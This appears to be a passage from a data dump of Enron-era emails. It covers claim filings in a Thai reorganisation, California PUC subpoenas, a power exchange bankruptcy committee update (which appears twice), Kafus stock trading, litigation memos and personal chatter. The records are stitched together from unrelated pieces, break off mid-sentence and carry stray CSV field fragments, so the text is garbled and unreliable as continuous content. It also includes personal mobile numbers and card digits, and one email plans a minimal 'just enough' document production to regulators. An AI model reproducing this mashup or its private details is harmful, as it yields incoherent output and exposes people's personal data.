Risk has tested above changes to the curve manager successfully.  Please let us know as soon as possible if you have other concerns by Monday (10/22) or we will ask IT to release the new version.

(our time) in relation to the above matter.

As discussed during the course of our telephone discussion, there are a
number of outstanding issues that, bearing in mind the 12 hour time
difference between Bangkok and you and the deadline of the claim submission
which is on Monday 7 August, we would require them to be settled by Friday.

1. Claim amounts
We note from the documentation so far received by us and your e-mail
yesterday that the following entities will claim under the following
agreements:

1.1 Enron North America Corp. wishes to claim for the principal amount
outstanding and the interest outstanding for the Notes under the Security
Purchase Agreement, Indenture and Guarantee.  We would appreciate it if this
could be confirmed and also the definite amount of principal and interest
that is to be claimed.

1.2 Enron North America Corp. wishes to claim for the shares (equity),
as listed in the Shareholders Agreement, held by it in NSM.  However, having
reviewed the documentation so far received by us we are unsure as to the
legal grounds under which Enron North America Corp is entitled to claim this
sum.  Could you please clarify the nature of this claim.

1.3 ECT Thailand Investment Inc. wishes to claim for the shares
(equity), as listed in the Securities Purchase Agreement, held by it in NSM.
However, as in 1.2 above, having reviewed the documentation received by us
we are unsure as to the legal grounds under which ECT Thailand Investment
Inc is entitled to claim this sum.  Could you please clarify the nature of
this claim.

1.4 ECT Securities Limited Partnership wishes to claim for any
contingent liability that they may be subject to as a result of the
litigation undertaken by Farallon Capital, et al. and Legg Mason Income
Trust, Inc., et al.  As discussed, the sums which are allowed to be claimed
have to be fixed sums as of the date on which the court granted an order to
reorganise NSM's business, i.e. 8 May 2000.  It would appear to us that,
asides from the legal fee sums, an exact sum for the contingent liabilities
cannot be ascertained at this time. I would, therefore, appreciate
clarification of how this is to be determined, otherwise the claim amount
may have to be the full potential liabilities as claimed in the two
litigation cases.

2. Documentation
As discussed, we also require the following documentation which we
understand will be faxed to us during the course of today.

2.1 Corporate documents of the 3 entities making claims
2.2 Evidence of the change in the entities name if different from the
name in the relevant agreements
2.2 Debenture Certificate (either global or definitive)
2.3 Evidence of the payment purchase price
2.4 A copy of the Notice of the Event of Default or demand letters as
sent by the Trustee (if any)
2.5 The ""Definition and Rules of Usage"" as defined in the Shareholders
Agreement (in addition, we do not know whether your claims in relation to
the Shareholders Agreement are related to certain documents as described
therein, e.g. Management Agreement, Enron Purchase Agreement, if they are
related, we would require copies of such agreements as well)
2.6 Tables setting out all amounts (i.e. principal, interest, expenses,
etc.) being claimed by the 3 claiming entities

As mentioned in our discussion, in order to complete the application on time
we would really need to have everything in place by Friday, given the
deadline of the claim submission is on Monday, 7 August.  We would,
therefore, appreciate it if you could reply to all of the above outstanding
issues by today (your time) so that if there are any further outstanding
issues we can try and clarify these during the course of tomorrow (our time)
and perhaps during the weekend.  You may either respond to this email or
alternatively call my mobile phone (661) 619 1262 or Richard Smith's mobile
phone (661) 611 1184.

Do you think you could give me a quick call at your convenience regarding the 
foregoing?  As you know, a number of companies received subpoenas in the 
California PUC investigation last week.  A few of our lawyers received 
inquiries late last week from a couple of those companies, most of which own 
CA situs generation plants, about possibly representing them in that 
investigation.  I informed my partners that we had met on this subject with 
ENA first and I told them to ""stall"" if at all possible for a few days since 
I wanted LeBoeuf to be available to assist ENA if the opportunity was 
presented to us.  I think you had said you were meeting with Jim and Mark 
last Wednesday to discuss which outside firm you would use and I was not sure 
whether a decision on that front had been reached.  Could you let me know if 
you have decided on another counsel to represent ENA so that I could inform 
my partners that they can go ahead and respond to some of the inquiries they 
have received.  Obviously, we would continue to like to work with ENA on this 
investigation, but we fully understand if you have decided to go with another 
counsel.  As you can appreciate, many of the companies involved are anxious 
to get outside counsel on board quickly, so if you could just let me know 
what the status may be on your front that would be tremendously helpful to 
us.  Thanks very much for your time and consideration in this regard.  I'm 
sorry we were not able to hook up in NYC last week, but hopefully we will be 
able to do that in the near future.  Thanks again.  John

4088,"Williams, Southern, Reliant and AES have filed motions to make the
protective order significantly stricter, and to stay the production of
documents until the protective order issues are resolved.  These generators
are taking a much harder line.  Counsel for Southern has advised me that
some of the generators may challenge a large part of the data request on
grounds of jurisdictional, burden, and trade secret intrusion.  It seems to
me that it may be best to let the generators fight for a stronger protective
order, and not take their side at this time.  We might well want to consider
proposing a ""most favored nations clause"" in our letter to the CPUC tomorrow
in order to take advantage of what ever tighter protective order is
eventually agreed to.  Generally, I feel the generators' stance will allow
us to be right where we want to be, not out front leading the charge, not
turning over everything right away, but instead making ""just enough"" of a
production to avoid being the center of attention.

I will forward the generators' pleadings to you as attachments to this

4124," As we have referenced in our monthly report,  Enron is involved in a dispute 
with Mr. Friedman concerning his involvement in a proposed natural gas 
transportation and marketing arrangement in the Republics of Mozambique and 
South Africa (the ""Pande Project"").   Mark Wawro at Susman Godfrey has been 
representing Enron Southern Africa Development and Enron Oil and Gas 
Mozambique in negotiations with the Friedmans' lawyer, Jim Reed, at Looper 
Reed. 
  On January 16, 2001, the above referenced lawsuit was filed despite the 
fact that the parties had recently met to discuss their respective positions 
and had agreed to exchange documents. The lawsuit was filed in the 133rd 
Judicial District Court of Harris County and, therefore, is pending before 
Judge Lamar McCorkle.  The defendants have not been served and the 
plaintiffs' lawyer has asked Mr. Wawro to accept service on their behalf. 
 The plaintiffs allege that the defendants  breached the subject consulting 
agreement by ""failing to honor and denying any intention to honor, their 
Development Fee and Investment Right obligations under the Consulting 
Agreement"". More specifically, plaintiffs seem to be complaining about a 
failure of the defendants to pay a percentage of the $30 million allegedly 
received in connection with  the transfer of defendants' interest in the 
Pande Project and termination of the plaintiffs' consulting agreement  The 
plaintiffs have also demanded an accounting as well as pre and post judgment 
interest.  A specific dollar amount of the damages sought was not provided.

4136,"look at the Oakland Trib article on Lockyer, if you haven't seen it
",Lockyer,,
4137,"The committee had a lengthy conference call today.  Let me touch on key
topics.  First, the application to employ PriceWaterhouse is being
contested by both the debtor and the US trustee.  There was a meeting today
with the debtor to narrow differences.  The debtor will provide a list of
its key concerns and we'll see if we can deal with them.  The UST just
believes that there is too much of a chance of conflict between roles in
the two cases.  We'll be setting a hearing soon to get the issue resolved
on way or the other.  Second, PGE has sought broad discovery from PX not
only of individual participants' claims against PGE but also underlying
trading information.  PX contends that much of this information cannot be
disclosed under the tariffs.  For that reason, PX hasn't even kprovided
this information to its participants.  Eisenberg is opposing the discovery
for that reason as well as based on burden to the debtor.  The PX committee
feels that Montali will accomodate discovery, at least to some extent.
Therefore, in the meet and confer this afternoon, the committee probably
will support disclosure if (1) participants get whatever of their
information as is disclosed to PGE, (2) substantial limitations are imposed
on the parties that will have access to the information and the use to
which it can be put and (3) PGE reimburses PX for a part of the cost.  In
addition, the committee intends to file a motion in the PX case requesting
that the debtor be ordered to turn information over to individual
participants and to our accountants who will have the responsibility to
test numbers but not to make general disclosure of accounts of individual
participants.  Third, Howard Weg believes that without some agreement on
the chargeback issue, FERC will take a long time to rule on whether PX
should return collateral.  Accordingly, Weg wants the participants to come
to an agreement that for any specified period, shortfalls will be shared
prorata among participants.  I asked Weg to send an email out to committee
members describing in detail his proposal and the basis for it so that we
could discuss it in detail during our next call.  Fourth, the commandeering
matters are proceeding.  The committee will complete interviews of
prospective counsel next Monday.  In the meantime, the Victims Compensation
Claims Board should rule June 22.  A summary denial is expected.
Interestingly, only about 30% of the participants submitted claims to the
board.  PX's expert opinion was made available to the committee.  He fixes
the value of commandeered contracts at $1.060 billion minus $350 million of
contract prices for a loss of just under $700 million.  We are following up
to test these numbers.  The committee's counsel has been negotiating a
stipulation for relief from stay in the PGE case.  It's moving too slowly,
so our counsel is drafting a stay relief motion for our review.  No one
seems inclined to start a commandeering suit until relief is granted.
Fifth, our counsel is having second thoughts about a stipulation with
Edison that would address the bond, the force majeur litigation and related
matters.  The question that is under review is whether the proposed deal
could be unwound if SCE files its own cha;pter 11 case.  On force majeur,
Judge Montali apparently rejected PGE's argument on that point.  Sixth,
there is still no deal with the trade creditors' committee.  They want
about double the $4 million we're offering.  We expect any day a motion to
extend plan exclusivity by the debtor.  Seventh, we discussed some
committee representation issues.  The committee voted against adding Puget
Sound as a member.  The committee agreed that it represented those who had
claims based on the scheduling coordinator role performed by PX for ISO.
The committee discussed whether it represented IOU's and concluded that it
did if they were owed in their role as sellers to the PX.  Finally, the
next meeting was set at 10 pst on June 25.  Feel free to call if there are
questions.  Bob Nelson","kprovided

4145,"Is this something we should respond to, both to clarify and defend our 
actions.  There are a lot of untruths in their memo including their ""lack of 
support"" of what they call ""Enron's actions"" which were in fact the Board's 
and/or Executive Committee's actions.  They were consulted on most if not all 
of the major issues, including the removal of senior management, financial 
restructuring, etc...  In any event, ENA never acted in a vacuum.  Everything 
was done in concert with the Board of Directors and/or the Executive 
Committee (Milt Datsopoulos, Linda Murdoch and myself) appointed by the Board.

On  Aug 1 we had a meeting in Vancouver when I resigned off the Board and Ray 
Bowen informed them ENA would not fund any longer.  The attendees were:  Ray 
Bowen, Randy Petersen and myself (all from ENA), Ken Swaisland (shareholder), 
Richard Bullock (Berkeley), Linda Murdoch (CFO of Kafus and member of the 
Board) and Milt Datsopoulos (Chairman of the Board).  Once informed of ENA's 
decision, Ken Swaisland immediately replied that this would put the company 
into bankruptcy and immediately began trying to cut a deal offering ENA all 
of Kafus' stock in CanFibre in exchange for its stock in Kafus and full 
forgiveness of all debt at the Kafus level.  We told Ken that ENA was not 
interested in such a deal but was open to discussing alternative 
restructuring proposals and encouraged them to bring ideas, restructuring 
plans, refinancings, etc... to us.  Back as early as May of this year 
(possibly even earlier although my involvement only goes back to May), Mike 
McCabe and Tony Valentine came to us stating they were working on a 
restructuring/refinancing plan.  Such a plan was never presented, although 
they did submit a  very broad (i.e., very few specifics) ""cost cutting"" 
plan.  In Berkeley's memo of 23, they again ask for an opportunity to present 
a ""plan.""  Where's the beef?

What I'd like to see their reaction to is questions re: the trading of Kafus 
stock within the first hour after we informed them of ENA's decision not to 
fund the company any more at our Aug 1 meeting in Vancouver.  The volume 
which normally traded in the 50,000 shares/d range had shot up to 150,000 
shares/d the two weeks preceding our Aug 1 meeting and on that very day over 
500,000 shares were sold.  Per Tony Francel, the IR guy at Kafus, all of the 
sales appeared to be coming in thru 3rd party agents from Europe.  Per Tony, 
whoever was executing the trades was taking careful steps to disguise their 
identity.  Chris Helfrich has a chart of the Aug 1 stock volume activity 
broken down into 15 min intervals and I noted on the same chart the timing 
and progress of our meeting that day in Vancouver including who was in the 
room at all times, when specific people left the room, etc.....  Based on the 
volumes being traded, there are only 3 people who could've been dumping that 
much stock over that short a period:  Swaisland, Berkeley and ENA.  We have 
confirmed that ENA has NOT sold any of its stock.

It's also important to note that preceding all of this, Berkeley had tried to 
get a couple of transactions ""pushed thru"" the Board including Kafus 
International (KIDG) and Hyaton.  In both cases, the Board rejected their 
proposals for two reasons:  1) the value being offered by Berkeley for each 
asset was very suspect to the relative market value and 2) the proposals were 
structured as ""forgiveness"" of Kafus debt to Berkeley, i.e., non-cash 
transactions.","Milt Datsopoulos Linda Murdoch Ray

 Jim,

 This will confirm our telephone conference about this matter, in light of 
Underwriters' recent response to our claim.  You will ask Underwriters' 
adjuster for permission for our chemist to speak directly with their chemist 
immediately about the facts.  You will also ask for a meeting to be set up 
for you, our broker, and Underwriters' adjuster to see whether Underwriters 
mean to take a hard line on our claim.

 Interestingly, Underwriters' position seems to be, at least preliminarily, 
and subject to further comment by their chemists, that nothing was wrong with 
our cargo or the ship; the cargo was simply misdescribed as turbine 
fuel-grade condensate by SGS due to flawed testing by SGS at loadport, when 
it was in fact nothing better than crude. Meanwhile, we all noted that 
Underwriters' adjuster included the following statement in her report:  ""It 
has not been demonstrated that the oil suffered from inherent vice.""  I am 
both pleased and surprised that this was included in Underwriters' report, 
and share David's feeling that the adjuster probably inadvertantly copied 
this from a confidential report from her chemist.  If we can successfully 
hammer at Underwriters' preliminary theory, Underwriters will find it more 
difficult to fall back on an inherent vice defense.

 I await further word from you.  Many thanks for your help.

4156,"The committee had a lengthy conference call today.  Let me touch on key
topics.  First, the application to employ PriceWaterhouse is being
contested by both the debtor and the US trustee.  There was a meeting today
with the debtor to narrow differences.  The debtor will provide a list of
its key concerns and we'll see if we can deal with them.  The UST just
believes that there is too much of a chance of conflict between roles in
the two cases.  We'll be setting a hearing soon to get the issue resolved
on way or the other.  Second, PGE has sought broad discovery from PX not
only of individual participants' claims against PGE but also underlying
trading information.  PX contends that much of this information cannot be
disclosed under the tariffs.  For that reason, PX hasn't even kprovided
this information to its participants.  Eisenberg is opposing the discovery
for that reason as well as based on burden to the debtor.  The PX committee
feels that Montali will accomodate discovery, at least to some extent.
Therefore, in the meet and confer this afternoon, the committee probably
will support disclosure if (1) participants get whatever of their
information as is disclosed to PGE, (2) substantial limitations are imposed
on the parties that will have access to the information and the use to
which it can be put and (3) PGE reimburses PX for a part of the cost.  In
addition, the committee intends to file a motion in the PX case requesting
that the debtor be ordered to turn information over to individual
participants and to our accountants who will have the responsibility to
test numbers but not to make general disclosure of accounts of individual
participants.  Third, Howard Weg believes that without some agreement on
the chargeback issue, FERC will take a long time to rule on whether PX
should return collateral.  Accordingly, Weg wants the participants to come
to an agreement that for any specified period, shortfalls will be shared
prorata among participants.  I asked Weg to send an email out to committee
members describing in detail his proposal and the basis for it so that we
could discuss it in detail during our next call.  Fourth, the commandeering
matters are proceeding.  The committee will complete interviews of
prospective counsel next Monday.  In the meantime, the Victims Compensation
Claims Board should rule June 22.  A summary denial is expected.
Interestingly, only about 30% of the participants submitted claims to the
board.  PX's expert opinion was made available to the committee.  He fixes
the value of commandeered contracts at $1.060 billion minus $350 million of
contract prices for a loss of just under $700 million.  We are following up
to test these numbers.  The committee's counsel has been negotiating a
stipulation for relief from stay in the PGE case.  It's moving too slowly,
so our counsel is drafting a stay relief motion for our review.  No one
seems inclined to start a commandeering suit until relief is granted.
Fifth, our counsel is having second thoughts about a stipulation with
Edison that would address the bond, the force majeur litigation and related
matters.  The question that is under review is whether the proposed deal
could be unwound if SCE files its own cha;pter 11 case.  On force majeur,
Judge Montali apparently rejected PGE's argument on that point.  Sixth,
there is still no deal with the trade creditors' committee.  They want
about double the $4 million we're offering.  We expect any day a motion to
extend plan exclusivity by the debtor.  Seventh, we discussed some
committee representation issues.  The committee voted against adding Puget
Sound as a member.  The committee agreed that it represented those who had
claims based on the scheduling coordinator role performed by PX for ISO.
The committee discussed whether it represented IOU's and concluded that it
did if they were owed in their role as sellers to the PX.  Finally, the
next meeting was set at 10 pst on June 25.  Feel free to call if there are
questions.  Bob Nelson","kprovided

think?

My points are not directly responsive to the prior e-mail, but I think this
gives us a hook to assert a position that you and I have discussed but never

................................................

Bruce,

I am a little late answering your attached e-mail.

Brian Barth met with Mike Swartz in the first half of 2000 in his capacity as
counsel for Oaktree and in the context of Oaktree's written agreement, and
Mike's oral agreement, that Oaktree's counsel would not disclose to, or use
for, Farallon anything learned from Barth in the meeting (which meeting
Oaktree insisted take place pursuant to the parties' written agreement.)

In direct violation of the written and oral agreements, Shawna Ballard
thereafter disclosed the Barth/Swartz meeting on the public record in Barth's
deposition and began asserting statements in the deposition that Brian had
allegedly made to Mike.  (Shawna's factual assertions about what Brian said
were in fact wrong, but that is beside the point.)  Until Shawna made her
disclosures, none of the defendants was even aware that the meeting had taken
place.  Now, as a result of Shawna's disclosures, in a variety of ways the
other defendants have initiated formal and informal discovery against Enron
and are otherwise taking positions adverse to Enron.  Enron intends to hold
Oaktree responsible for all damages arising out of its breach of its written
agreement with Enron, including Enron's substantially increased attorneys fees
in the various litigations.

4158,"Farallon/Oaktree's counsel, Bruce MacLeod, began his questioning of Izower on 
Friday 9/1.? MacLeod began by establishing that (1) in drafting the offering 
White & Case attorneys relied upon information given to them by the 
underwriters and (2) if the underwriters would have indicated to White & Case 
that information in the offering memo was incorrect, White & Case would have 
changed the offering memorandum.? MacLeod also established that Izower had 
discussed the related party transactions with all of the initial purchasers 
at one point or another.? MacLeod then attempted to revist the issue 
concerning Chanmi's integrity and whether Chanmi's acceptance of kickbacks 
was discussed with the underwriter group.? Izower's counsel refused to allow 
MacLeod to revisit this testimony and McLeod ended his inquiry.

SDI's counsel, Mike Strub, was the only defense counsel to ask questions. (I 
determined that the it made no sense to draw any attention to Enron/ECT given 
that the testimony concerning Enron/ECT had been limited to general 
statements concerning the ""underwriters').? Strub attempted to establish that 
SDI was not listed on White & Case's responsibility outline as one of the 
drafters of the offering memo.? Izower agreed that SDI did not initially 
draft the offering documents, but indicated that SDI commented on drafts.? 
Izower also testified that he asked SDI's counsel Bob Walters to review the 
related party transactions section of the memo and to comment on its 
accuracy.? On rebuttal, MacLeod focused on SDI and established that SDI 
reviewed and revised portions of the offering memo. and that Busse attended 
the road shows and never advised Izower that the information contained in the 
memo. concerning SDI's role was inaccurate.

and Legg Mason and walk away from all these cases.? I told him we were 
considering it, but Enron did not want to encourage anyone else to sue Enron 
by showing a willingness to pay money just to get out of a lawsuit.? Tom 
replied that he thought that there was virtually no chance that anyone else 
would sue Enron now.? Since Hatch's clients have appeared to be the most 
likely prospects for still suing Enron, this was a very encouraging

I note that we have since resumed trading with Hyundai (albeit with Hyundai

has chartered a vessel from Chembuk Trading which our broker advised to be an

Resource Development signed the new Market Surveillance Amendment Regulation 
into law.   The new regulation made four changes to the existing Market 
Surveillance Regulation, namely:

(a) it gave the MSA the new authority to monitor the conduct of the PPA 
Owners in relation to compliance with their obligations under the PPAs;
(b) it gave complaintants a mechanism to appeal a decision of the MSA not to 
further investigate a complaint to the Power Pool Council;
(c) it retained the mandatory referral mechanism by the MSA to another agency 
if the MSA's investigation determines the matter falls within another 
agency's jurisdiction (i.e. Competition Bureau) but has eliminated the 
requirement that upon such a referral the MSA cease its own investigation.   
The Power Pool Council now has the authority to determine whether the MSA 
should carry on with its investigation after a referral, or not.
(d) it added a section relating to the MSA's authority to apply to the Court 
for an order authorizing it to take evidence outside of Alberta.

On Oct 28th PG&E filed to change the nature of the interconnect and banking agreement with WAPA.  Currently PG&E looks at the imbalance energy (positive or negative) at the end of the month and then figures out what charges are due either party.  The imbalance account is calculated by aggregating MWHrs for the entire month.  As a result, WAPA would have a deficit in the account and then deposit a huge amount of off peak energy to balance out.

As of OCt 28th all this changes - WAPA has to submit a balanced schedule on an hourly basis or else be subject to PG&E imbalance prices (which are probably a combination of contracts and spot prices).  I believe this means that WAPA is going to have to be more diligent about its forcasts and more active in the real time and preschedule markets.  We probably need to gear up our relationship with the appropriate people over there to make sure that we are on their phone list.

Doug has been on my computer for the past two days finishing his thesis, so
I haven't been able to write back.

Well-- if nothing else, at least you can practice your witty repartee with
him.  Did he write back?  That non-conference opponent excuse was lame.
Exactly who were the non-conference opponents--Rice, SMU, Slippery Rock...
Hmmm.  We need a little more information to give that credibility.

I have been studying like a nerd lately, so hopefully, finals won't be so
stressful this year.  I keep remebering that we gave that shower right
before my finals last semester.  That comforts me-- I know wasn't prepared
for any of them at that time and class had already ended.

Anyway, I just had a 15 minute conversation with the Time Warner Cable guy--
I called to pay my bill because I lost the paper copy-- first, he looked at
my address, saw it was near Hyde Park Bar and Grill-- and preceded to
disucss all of the wonderful menu items-- french fries, Reuben sandwich,
iced tea-- then I gave him my credit card number and he asked me if it was a
USAA card-- apparently you can tell by the first 4 digits-- 5416-- who knew?
  We talked about how great USAA is for 5 minutes.  Then he asked me if I
was in school in Austin-- so we talked about that...  When he finally
finsihed with me, I thought he was going to ask me out.  If it weren't for
Doug, I would have gone- he was quite a nice guy.

Anyway, it was refreshing considering how many idiots, jerks, assholes, etc.
work in the service industry.

Well, let me know what's going on.

Talk to you later.

",Deron Hewitt,,Ashley
4297,"My several hours of on-line research on this last Sept. turned up nothing on 
point.  The only case that even addressed the issue of confidentiality of 
contracts in a certificate context was one I'll excerpt here:

**
 In Maritimes & Northeast Pipeline, L.L.C., 80 FERC P 61,346 (1997), 
Maritimes requested confidentiality for the precedent agreements it 
submitted. Commission staff denied the blanket request, but indicated that 
Maritimes could request that specific provisions be kept confidential. 
Maritimes subsequently requested that the contract terms and various cut-off 
dates [FN29] in the precedent agreements be kept confidential because such 
information was commercially sensitive. On the other hand, Maritimes 
requested that the terms and conditions of the backstop agreements be kept 
confidential, but was willing to make the contract terms of 10 and 20 years 
public. Generally, the Commission will deny blanket requests for 
confidentiality of agreements that are submitted to demonstrate market 
support for new facilities. [FN30] However, in the instance case, the 
contract terms of the backstop agreements are public and, thus, evidence of 
longterm subscriptions for Maritimes proposal are in the public record and 
support our finding that Maritimes has demonstrated a market for its proposed 
services. Therefore, we find no compelling reason to require the length of 
the terms of the other precedent agreements or the cut-off dates to be made 
public. 

FN29 Cut off dates refer to points in time when individual contracts could 
terminate contingent on the
occurrence of certain events.

FN30 See, e.g., Colorado Interstate Gas Company, 76 FERC P 61,291 (1996).
**

In Amoco Production Company and Amoco Energy Trading Company V. Natural Gas 
Pipeline Company of America, 82 FERC P 61,037 (1998), which involved a 
request for confidentiality of a gas sales agreement, the Commission 
explained why a gas sales agreement should be given confidential treatment 
but transportation contracts should not:  

the Commission has explicitly held that gas transportation rates stand on a 
different
footing from gas sales rates because pipelines and their competitors are 
subject to similar disclosure
requirements. In ANR Pipeline Co., the Commission explained that unlike gas 
sales in a
competitive market, transportation of natural gas is still regulated under 
the assumption that the pipeline
exercises market power. Even where transportation competition exists, that 
competition is from other
pipelines that are likely to be subject to similar filing and reporting 
requirements. 

There were several cases denying confidential treatment of rates in the 
context of Section 4 cases.  

Just to make sure I found everything, I'll do some follow up sometime in the 
next few days and let you know if I find anything.

4307,"First off I hope your still not at work when I send this.

Secondly it would be cool to meet earlier in the week but I'm in San Antonio
and will be until Friday.  I will be driving to Houston on Friday morning to
do some packing and then the parents will be coming up on Saturday morning
to help with the final move.  I will pretty much leave it in your ball park
about Friday night.  I know you have been working long hours and Friday is
just a bad day.  Even though I would like to see you, if you have a repeat
of last week then I understand if you want to call it off.  In that case
maybe we can meet up some other time.  Although I do remember a girl telling
me once that weekends are her time and she was going to go out no matter
what.

Let me know what you think and I'll probably give you a call Friday
afternoon to see how things are going.

4308,"Hey Ted,

Just wanted to check and see if you guys are still going planning on going 
tonight.  We have been having some major systems issues today so I'm about to 
really throw myself into my work in an effort to get out of here at a 
reasonable time.

Susan",Ted Susan,,
4309,"While I don't truly fear you becoming a bitter individual as a result of 
these negative experiences, I do feel the highlighted section below is now 
more appropriate than ever.

One must keep their eyes open and use all of the wisdom they possess when 
they trust.  Just as I suggested that positive experiences can cause one's 
level of trust to grow exponentially, negative experiences can cause 
irreparable harm.  If you trust blindly or too willingly and that trust is 
violated it colours every aspect of your life.  There are too many people in 
this world that have become bitter and cynical, not because they were born 
that way but, because they handed out trust haphazardly and too many times 
that trust was thrown back in their face.  I don't mean to suggest from the 
above that one should live in a day-to-day mind-set of distrust but rather 
that they must really look at people and all the aspects which they posses.  
I have come to the conclusion that if you spend most of your time observing 
and listening to people rather than always taking the lead you will learn a 
great deal more about them and their character.  The smallest acts and 
statements can in fact say the most, so always be observant. (This includes 
listening to what others have to say and paying attention to the opinions of 
people whom you respect.)

To that end I have one last comment...I am constantly amazed and periodically 
reminded what fragile creatures we humans are.  That beyond the hype and 
self-grandizing the basic components of ourselves (our experiences, fears, 
cares, concerns, needs etc.) cannot be completely disregarded and will always 
be a part of us.  I think that only by recognizing those components and 
trying to understand their origin can we truly become stronger.",,,

In our previous communication, we indicated that we would provide you with more detailed information as it became available.

Beginning Friday, October 26, 2001 at 9 a.m. C.S.T, the procedure for calling Enron's Houston offices from international locations, excluding Canada, using the 800-97-Enron phone number will change.  The new procedure is as follows: 

1.	Please dial the WorldPhone International Access number for the country where you are located (country access code), which is available on the attached wallet card, accessible through the following link:  http://home.enron.com:84/messaging/mciannouncement.doc.    
2.	You will then be prompted for your PIN number.  Since calling cards and pin numbers are not required to use this service, all users should respond by dialing 1-800-97-ENRON or 1-800-973-6766. 
3.	You will then be asked to enter your destination.  Please dial 0-800-97-Enron (800-973-6766) to reach Enron's corporate offices in Houston.
  
This procedure can only be used to call 800-97-Enron from WorldPhone International locations.  If you are calling from the U. S. or Canada, please continue to dial 1-800-97-ENRON.
  
If you have questions regarding commercial aspects of this agreement, please feel free to contact Tom Moore, GSS senior contract manager at 713-345-5552.  For technical issues, please contact Hasan Imam, ENW IT manager at 713-345-8525.

4321,"Hi guys!

I have been incredibly disorganized about the rsvps for Caycie's party this
weekend - so if you have already sent it in, I am so sorry!

Please email me back and let me know if you will be there for the Friday
night dinner (8:00 - Wimberly) and if you want to get a manicure/peticure
on Saturday.

Thanks!

Love,
Lisa

4328,"It's kind of funny, everybody has the same feeling about the ""Ted situation"" 
- utter disappointment.  But yes, it is definitely his loss.  And, I loved 
the fact that Kevin (his friend) spent so much time talking to my Dad because 
that had to make Ted feel like a complete jerk (which he is).

I'm am very excited about my trip to London.  The other guy I mentioned in 
the email, Darren, is going to be working over there for a few months so I'll 
get to see him there as well.  Plus, in November I'm going to visit my 
brother and his wife in South Korea which should be interesting.  The globe 
trotting continues.

Your weekend sounds like it's going to be pretty fun.  I wish I could be 
there as well, but it is football season so I will be in Austin this 
weekend.  I've signed up for all these internet airfare specials though, so 
if some great fares come up for Houston to San Diego I can take advantage of 
them.  Talk to you soon.

4331,"Enron Elves is an annual volunteer opportunity that is run by Associates and 
Analysts in conjuction with the Wesley Community Center's ""Adopt-A-Family"" or 
""Angel Tree"" program. The Wesley Community Center is affiliated with St. 
Luke's Methodist Church that has been in operation for 20 years and has 
supported this program for 12 years. Many of you may have been involved with 
similar programs previously in school or through other organizations. The 
Wesley Community Center provides us with the details of each family that the 
Enron Elves will adopt. We will then form different teams, each of which 
adopts one family. The teams raise or donate money for the families to buy 
Christmas gifts and food vouchers. As a bonus, Enron will match all funds 
that we raise and donate them to the Wesley Community Center. Just before 
Christmas, the teams get together for a wrapping party that is sponsored by 
the Elves and the AA Program that is always a fun and festive time.

David Guillaume and Katie Stowers are coordinating this year's program and we 
need lots of volunteers to be team leaders and members. Team leaders are 
needed to staff teams in conjunction with David and Katie. Leaders will 
essentially coordinate the fund raising/donating, present buying, wrapping, 
and delivery for their team. I was a team leader last year, and it was an 
easy, fun, and  very rewarding job. We need lots of volunteers to make 
Christmas very special this year for needy families in the Houston area!

If you would like to be a part of this rewarding program, please email David 
or Katie by Friday, October 27th. Please indicate in your response if you are 
interested in being a team leader. If you have any questions at all regarding 
this program, please give David (3 - 5034) or Katie (3 - 3339) a call. Thanks 
so much in advance!

Sincerely,

4333,"oh, the holiday spirit is in the air- not that i've been subjected to it 
stuck in this shitty library desperately trying to write and research things- 
believe it or not!- i should've done 3 weeks ago.....at least i'm 
consistant.? hope all is well in houston- any news about the london thing?? i 
have a sneaking suspicion it's not going to happen- call me a cynic, but i'm 
getting bad vibes, n'est pas?? damn!? claudia is driving me nuts- and i've 
had this horrible weighty sense of deja vu- couldn't figure it out til last 
week marci mentioned something that triggered?the memory: i was, of course 
bitching about how sick i am of her badgering and lecturing me to 'party' w/ 
her at her shady discos, and marci laughingly says it's prob b/c she's 
secretly a lesbian, and is trying to hit on me.....aughhhhh1? she's kim 
barton!? although i'm not saying for sure i think kim's a lesbo (yeah, right- 
she's just nuts, at the very least....) and i k! now claudia's straight- but 
it's those boarding school kids- clingy and desperate for attention, but 
soooooo much more sophisticated and wordly than just a silly little 
conservative texas girl who has had the same friends for 15 years- basically 
just fell off the potato truck...i'm soooooo naive.? it's annoying how she 
manipultes her provenence when it's convenient- she's sooooooo texas when 
it's cute to be wholesome and outdoorsy and fun, but she'd totally 
'international' when it comes to interacting with other cultures, and how 
many 'experiences' she's had.? ohhh, she's seen fire and she's seen rain, 
alright.....just want to say to her that just b/c daddy sent her away with a 
whole bunch of other spoiled brats that never learned to socialize and behave 
properly b/c they didn't HAVE to- daddy  and 'the family' would always get 
her out of any sticky situation......maybe she's not quite as worldly and 
fabulous as she thinks.? i can not TELL you how many 'lectur! es' she's given 
me about how i'm not social enough, and if i would just let her take me under 
her wing, she could really help me grow up ( can you HEAR the 
condescention?)? i sit there and just nod dumbly, then? am fuming and it's 
all i can do to walk away w/ out slapping the haughty, self-satisfied 
expression off her face.? would like then to tell her that i've probably been 
doing more than she has been socially, but she wouldn't know b/c i'm not 
doing them w/ her...and wouldn't want to invite her along.? it would kill 
her!? she really thinks i go to the library at night, or turn my ringer off 
and read at 9:30.? bless her heart- it she weren't so pushy (my GOD- do you 
remember how bad kim was our sophmore and jr year?? constantly calling and 
putting me on guilt trips, harassing me to spend the night, and i'd have to 
finally give up, and throw her a bone and do it just to placate her?)? i'd 
just tell her i'm hanging out w/ other people! , but don't want her to go 
nuts!? well, enough venting for now....did tell her i'd be in california til 
dec 18th so she wouldn't call me- either in london or houston.? i am really 
sneaky......anyways- hope all is well- wish you were coming w/ kates- it'd be 
fun.? but- i'm sure you'll be having JUST as much fun at enron....will be 
drinking- alot- in your honor- don't worry!

CA Gets 2nd Merchant Storage Project, 3rd on the Way

      Setting aside vociferous local opposition from nearby property owners 
and a proposed denial from one of its
      administrative law judges (ALJ), the California Public Utilities 
Commission Thursday gave the go-ahead to a
      proposed $80 million underground natural gas storage field near Lodi in 
Northern California. 

      Texas-based Western Hub Properties' $80 million Lodi storage project is 
designed to have 12 Bcf of working
      capacity, with 400 MMcf/d injection and 500 MMcf/d withdrawal capacity. 
It includes a 35-mile transmission
      pipeline that connects with Pacific Gas and Electric Co.'s backbone 
pipeline. It will be the state's second
      non-utility storage project, following Wild Goose storage which went 
into service last year. Approval of the Lodi
      project is effective in mid-June. 

      While CPUC Commissioner Richard Bilas said he supports ""letting the 
market decide"" whether a project should
      be built and encourages competition in gas storage, he ""cannot support 
allowing competitors to use regulatory
      loopholes to take advantage of private property owners. In my view, 
this case comes precariously close to
      allowing that to happen."" 

      Although the Lodi project won environmental approval from an ALJ, the 
judge recommended the project not be
      built because it didn't meet local-need criteria. 

      After postponing a decision on the proposed denial of the project, the 
